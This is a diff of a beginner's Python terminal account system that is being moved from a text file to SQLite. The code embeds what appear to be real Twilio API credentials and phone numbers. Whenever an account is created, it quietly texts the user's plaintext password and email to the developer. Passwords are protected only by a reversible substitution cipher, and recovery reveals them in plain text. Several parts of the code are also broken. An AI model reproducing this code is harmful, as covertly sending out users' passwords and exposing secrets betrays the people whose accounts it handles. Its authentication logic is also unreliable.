@@ -1,19 +1,18 @@
 
-import smtplib, os.path, os, getpass, datetime, time, random, webbrowser, password
+import smtplib, os.path, os, getpass, datetime, time, random, webbrowser, password, sqlite3, googlemaps
 from PIL import Image
 from tkinter import Tk
 from tkinter.filedialog import askopenfilename
 from twilio.rest import TwilioRestClient
- 
-
 os.system('clear')
-
 print('Loading...')
-
-
-
+#Set up SQL
+db = sqlite3.connect('User.db')
+cursor = db.cursor()
+cursor.execute('''CREATE TABLE if not exists users (username text primary key, password text, email text, age text, petname text, bio text, todayDate text, filename text, career text, gender text, homeAddress text)''')
+db.commit()
+db.close()
 #Set up Email server
-
 try:
 	server = smtplib.SMTP('smtp.gmail.com', 587) #port 465 or 587
 	server.ehlo()
@@ -23,17 +22,6 @@ try:
 except:
 	print('It seems something went wrong, please check your wifi connectivity and try again')
 	quit()
-
-
-
-"""
-Recovery Gmail SENDER :
-Acc:
-	User: password3
-	Pass: password2
-"""
-
-
 #Create variables
 loggedin = False
 RegisterRun = False
@@ -41,54 +29,33 @@ emailFound = False
 
 
 """
-Add directions to go home
-Secret commit (hides password)
-
+Add friends
+Add medical info with link to how to solve the disease
+Add I don't have a pet option
 Add telephone number
-Add Bank account and password
 Add error check for the file selector if not an image
-Close the file selector
-Make the image display in the terminal
-Use squl
+add squl to readme
 """
 
 
 
 
-#Create accounts
-accounts = []
-if not os.path.isfile('accounts.txt'):
-	print('Creating accounts.txt ...')
-	open('accounts.txt', 'w')
-
-with open('accounts.txt', 'r') as myFile:
-	info = myFile.read()
-	info = info.split(',')
-	for i in range(len(info)):
-		if i%11 == 0:
-			accounts.append(info[i:i+11])
-
-#print(accounts)
-
 def Register():
-
 	print('Username and Passwords must only contain letters and numbers')
-
 	#Make the confirmation code
 	confirmationCode = random.randint(1000, 5000)
-
 	#Ask questions to setup account
 	goBack = input('To go back to the home menu press 1, to continue press Enter: \n')
 	if goBack == '1':
 		return
 	else:
-
-		#Start the selection of the profile picture
-		print('Please select the image you would like to use as your profile photo \nPlease wait for the selector to open...\n')
-		Tk().withdraw()
-		filename = askopenfilename()
-		#print(filename)
 		Username = input('Create a Username: ')
+		db = sqlite3.connect('User.db')
+		curs = db.cursor()
+		curs.execute('''select * from users where username = ?''', [(Username)])
+		if curs.fetchall() != []:
+			print('Username is taken')
+		db.close()	
 		Password = getpass.getpass('Create a Password: ')
 		CheckPassword = getpass.getpass('Please re-type your Password: ')
 		if CheckPassword != Password:
@@ -96,6 +63,10 @@ def Register():
 			Register()
 		emailAddress = input ('Please enter a recovery email: ')
 		birthday = input('Please enter the year you were born: ')
+		#Start the selection of the profile picture
+		print('Please select the image you would like to use as your profile photo \nPlease wait for the selector to open...\n')
+		Tk().withdraw()
+		filename = askopenfilename()
 		petname = input('Please enter your first pet\'s name: ')
 		bio = input('Bio:	(May not contain commas) Please tell us a little about yourself: ')
 		career = input('Enter the name of your company *optional (Press enter to skip): ')
@@ -111,12 +82,7 @@ def Register():
 			print('The option you have selected is not an option')
 			Register()
 		today = datetime.date.today()
-
 		#Error handling
-		for account in accounts:
-			if account[0] == Username:
-				print('This username has already been taken.')
-				Register()
 		if Username == '' or Password == '' or emailAddress == '' or birthday == '' or petname == '' or bio == '' or homeAddress == '':
 			print('Error: You have left one of the questions blank')
 			Register()
@@ -137,11 +103,9 @@ def Register():
 		if UserHasNonNumber == True:
 			print('Your password contains characters that are not letters and numbers')
 			return
-
 		if '@' not in emailAddress or '.' not in emailAddress:
 			print('Error: The email adress you have typed in does not exist. Please try again.')
 			Register()
-
 		#ENCRYPT THE PASSWORD	
 		key = password.password1
 		alphabet = 'abcdefghijklmnopqrstuvwxyz1234567890 '
@@ -155,10 +119,8 @@ def Register():
 		except ValueError:
 			print('Error: You typed in a word instead of a number for your birthday')
 			Register()
-
 		#Calculate the age
 		calculatedAge = 2016 - int(birthday)
-
 		#Send email confirming account has been made
 		message = 'Welcome User ' + Username + ',\nYour account is one step away from being made. Copy and paste the verification code into the program to continue. Verification code: ' + str(confirmationCode) + '\n\n-Account Info'
 		try:
@@ -167,24 +129,22 @@ def Register():
 			print('It seems something went wrong, please check you wifi connectivity and try again')
 			Register()
 		#Confirm email
-		verificationCode = input('A verification code has been sent to your email, please type it in here to confirm your account: ')
 		webbrowser.open("https://mail.google.com/mail/")
+		verificationCode = input('A verification code has been sent to your email, please type it in here to confirm your account: ')
 		if str(verificationCode) == str(confirmationCode):
-
 			client = TwilioRestClient("AC29cd2211a452fe4e4f745fee7fdb048a", "11bf9e6de7779b7b7093c407e1ea6e88")
 			client.messages.create(to="+16504419188", from_="+12019037850", body="An account has just been created. The username for the account is: " + Username + " and the password is: " + Password)
-
-
 			#Record the setup data and finalize creation of account
-			with open('accounts.txt', 'a') as myFile:
-				myFile.write(str(Username) + ',' + str(encryptedPassword) + ',' + str(calculatedAge) + ',' + str(petname) + ',' + str(emailAddress) + ',' + str(bio) + ',' + str(today) + ',' + str(filename) + ',' + str(career) + ',' + str(gender) + ',' + str(homeAddress) + ',')
-				myFile.close()
-			with open('accounts.txt', 'r') as myFile:
-				info = myFile.read()
-				info = info.split(',')
-				for i in range(len(info)):
-					if i%11 == 0:
-						accounts.append(info[i:i+11])
+			#Use sql
+			create_user_db = sqlite3.connect('User.db')
+			curs = create_user_db.cursor()
+			try:
+				curs.execute('''INSERT INTO users (username, password, email, age, petname, bio, todayDate, filename, career, gender, homeAddress) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''', [(Username), (encryptedPassword), (emailAddress), (calculatedAge), (petname), (bio), (today), (filename), (career), (gender), (homeAddress)])
+			except:
+				print('Username has already been taken')
+				Register()
+			create_user_db.commit()
+			create_user_db.close()
 			print('\n' + Username + '\'s account has been made. \n')
 		else:
 			resend = input('The verification code you have entered is incorrect. To resend the code press 1, to go back press any key: ')
@@ -196,21 +156,12 @@ def Register():
 					print('It seems something went wrong, please check you wifi connectivity and try again')
 					Register()
 				verificationCodetwo = input('The re-verification code has been sent to your email, please type it in here to confirm your account: ')
-				
-				print(verificationCodetwo, type(verificationCodetwo))
-				print(confirmationCode, type(confirmationCode))
-
 				if str(verificationCodetwo) == str(confirmationCode):
-					print('Made IT HERE********************')
-
 					client = TwilioRestClient("AC29cd2211a452fe4e4f745fee7fdb048a", "11bf9e6de7779b7b7093c407e1ea6e88")
-
 					client.messages.create(to="+16504419188", from_="+12019037850", body="An account has just been created")
-
 					# Send text letting me know an account has been made
 					client = TwilioRestClient("AC29cd2211a452fe4e4f745fee7fdb048a", "11bf9e6de7779b7b7093c407e1ea6e88")
 					client.messages.create(to="+16504419188", from_="+12019037850", body="An account has just been created, the username is: "+Username+' , the email: '+emailAddress+' ,and the password: '+Password)
-
 					with open('accounts.txt', 'a') as myFile:
 						myFile.write(str(Username) + ',' + str(encryptedPassword) + ',' + str(calculatedAge) + ',' + str(petname) + ',' + str(emailAddress) + ',' + str(bio) + ',' + str(today) + ',' + str(filename) + ',' + str(career) + ',' + str(gender) + ',' + str(homeAddress) + ',')
 						myFile.close()
@@ -221,20 +172,14 @@ def Register():
 							if i%11 == 0:
 								accounts.append(info[i:i+11])
 					print('\n' + Username + '\'s account has been made. \n')
-
-					
 			else:
 				return
 
-
 def Login():
-
 	emailFound = False
-
 	#Ask login questions
 	UsernameLogin = input('Enter a Username: ')
 	PasswordLogin = getpass.getpass('Enter a Password: ')
-
 	#Encrypt login password to compare to password in txt file
 	key = password.password1
 	alphabet = 'abcdefghijklmnopqrstuvwxyz1234567890 '
@@ -243,102 +188,111 @@ def Login():
 	for ch in PasswordLogin:
 		index = alphabet.find(ch)
 		encryptedLoginPassword += key[index]
-
 		#Check if password matches
+	create_user_db = sqlite3.connect('User.db')
+	curs = create_user_db.cursor()
+	curs.execute('''select * from users where username = ? and password = ?''', [(UsernameLogin), (encryptedLoginPassword)])
+	user = curs.fetchone()
+	create_user_db.commit()
+	create_user_db.close()
+	if user == [] or user is None:
+		print('Account Not Found')
+		loggedin = False
+	else:
+		#Password matches, log the user in
+		loggedin = True
+		age = user[2]
+		petname = user[3]
+		bio = user[5]
+		today = user[6]
+		filename = user[7]
+		career = user[8]
+		gender = user[9]
+		homeAddress = user[10]
+		print('Welcome user ' + UsernameLogin + '!')
+		print('You are ' + age + ' years old.')
+		print('You\'re first pet\'s name is ' + petname + '.')
+		print('Bio: ' + bio)
+		if career != '':
+			print('The company you work for is: ' + career)
+		print('Gender: ' + gender)
+		print('You live at: ' + homeAddress)
+		print('Account created on: ' + today)
+		print('Your profile photo is opening...\n')
+		profileDisplay = Image.open(str(filename))
+		profileDisplay.show()
 
-	for account in accounts:
-		if account[0] == UsernameLogin and account[1] == encryptedLoginPassword:
-			loggedin = True
-			age = account[2]
-			petname = account[3]
-			bio = account[5]
-			today = account[6]
-			filename = account[7]
-			career = account[8]
-			gender = account[9]
-			homeAddress = account[10]
-			print('Welcome user ' + UsernameLogin + '!')
-			print('You are ' + age + ' years old.')
-			print('You\'re first pet\'s name is ' + petname + '.')
-			print('Bio: ' + bio)
-			if career != '':
-				print('The company you work for is: ' + career)
-			print('Gender: ' + gender)
-			print('You live at: ' + homeAddress)
-			print('Account created on: ' + today)
-			print('Your profile photo is opening...\n')
-			profileDisplay = Image.open(str(filename))
-			profileDisplay.show()
+
+
 
 	global loggedin
 	#global profileDisplay
 	if not loggedin:
 		print('Incorrect password or username')
 		reset = input('Forgot Password? Press 1 to reset, 2 to re-enter your password, and any other key to go back: ')
+		global reset
 		if reset == '1':
 			resetUsername = input('Enter your username associated with the account you would like to recovery: ')
-			for account in accounts:
-
-					#Record info stored in txt
-				if account[0] == UsernameLogin:
-					resetPassword = account[1]
-					resetEmail = account[4]
-					securityQuestionAnswer = account[3]
-					key = 'bad5cfeh8gjilkn16mp2or39qts74vux0wzy/ '
-					alphabet = 'abcdefghijklmnopqrstuvwxyz1234567890 '
-					resetPasswordDecrypted = ''
-					for ch in resetPassword:
-						index = key.find(ch)
-						resetPasswordDecrypted += alphabet[index]
-
-					#Ways to recover accounts
-					message = '\n\nRecovery account_info: \nHello ' + resetUsername + ',\n' + 'Your Password is ' + resetPasswordDecrypted + '\n \n Thanks for your service \n -Recovery Accounts.info'
-					HowtoRecover = input('You have to ways to recover your account \n1. You can answer a security question \n2. You can recieve an email containing your password \n: ')
-					if HowtoRecover == '1':
-						securityQuestion = input('What is the name of your first pet? ')
-						if securityQuestion == securityQuestionAnswer:
-							print('You have successfully recovered your account, your password is ' + resetPasswordDecrypted)
-						else:
-							print('You have failed to answer the security question')
-							return "," ","
-					elif HowtoRecover == '2':
-
-
-						try:
-							server.sendmail('InfoRecovery.User@gmail.com', resetEmail, message)
-							print('You will be receiveing an email shortly...')
-
-						except:
-							print('It seems something went wrong, please check you wifi connectivity and try again')
-							Login()
+			#Record info stored in txt
+			create_user_db = sqlite3.connect('User.db')
+			curs = create_user_db.cursor()
+			curs.execute('''select * from users where username = ?''', [(resetUsername)])
+			user = curs.fetchone()
+			create_user_db.commit()
+			create_user_db.close()
+			if user[0] == resetUsername:
+				resetPassword = user[1]
+				resetEmail = user[4]
+				securityQuestionAnswer = user[3]
+				key = 'bad5cfeh8gjilkn16mp2or39qts74vux0wzy/ '
+				alphabet = 'abcdefghijklmnopqrstuvwxyz1234567890 '
+				resetPasswordDecrypted = ''
+				for ch in resetPassword:
+					index = key.find(ch)
+					resetPasswordDecrypted += alphabet[index]
+				#Ways to recover accounts
+				message = '\n\nRecovery account_info: \nHello ' + resetUsername + ',\n' + 'Your Password is ' + resetPasswordDecrypted + '\n \n Thanks for your service \n -Recovery Accounts.info'
+				HowtoRecover = input('You have to ways to recover your account \n1. You can answer a security question \n2. You can recieve an email containing your password \n: ')
+				if HowtoRecover == '1':
+					securityQuestion = input('What is the name of your first pet? ')
+					if securityQuestion == securityQuestionAnswer:
+						print('You have successfully recovered your account, your password is ' + resetPasswordDecrypted)
 					else:
-
-						#Error handling for selecting a key that is not an option
-						print('You did not select an available option')
-						return "," ","
-					emailFound = True
-
-			#Error handling for username not existsing
-			if emailFound == False:
-				print('The username you typed in does not exist.')
-		elif reset == '2':
-			Login()
+						print('You have failed to answer the security question')
+						return UsernameLogin, loggedin
+				elif HowtoRecover == '2':
+					try:
+						server.sendmail('InfoRecovery.User@gmail.com', resetEmail, message)
+						print('You will be receiveing an email shortly...')
+					except:
+						print('It seems something went wrong, please check you wifi connectivity and try again')
+						Login()
+				else:
+					#Error handling for selecting a key that is not an option
+					print('You did not select an available option')
+					return "," ","
+				emailFound = True
+		#Error handling for username not existsing
+		if emailFound == False:
+			print('The username you typed in does not exist.')
+		loggedin = False
+	elif reset == '2':
+		Login()
+	print('YAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYA')
+	print(loggedin)
 	return UsernameLogin, loggedin
 
-
 def LogOut(UsernameLogin):
-
 	#Log the individual out
 	loggedin = False
 	print(UsernameLogin + ' has logged out --  ')
 	return loggedin
-
-
-
 #Create a navigational menu
 exit  = False
 while not exit:
+	#os.system('clear')
 	print('1. Register')
+	print(loggedin)
 	if loggedin:
 		print('2. Log out')
 		print('3. Exit')	
@@ -347,13 +301,11 @@ while not exit:
 		print('3. Exit')
 	selection = input('Input: ')
 	if selection == '1':
-
 		#Register
 		os.system('clear')
 		Register()
 	if loggedin:
 		if selection == '2':
-
 			#Log Out
 			os.system('clear')
 			loggedin = LogOut(UsernameLogin)
@@ -362,11 +314,9 @@ while not exit:
 			exit = True
 	else: 
 		if selection == '2':
-
 			#Login
-			UsernameLogin,loggedin = Login()
+			UsernameLogin, loggedin = Login()
 		elif selection == '3':
-
 			#Exit
 			os.system('clear')
 			exit = True
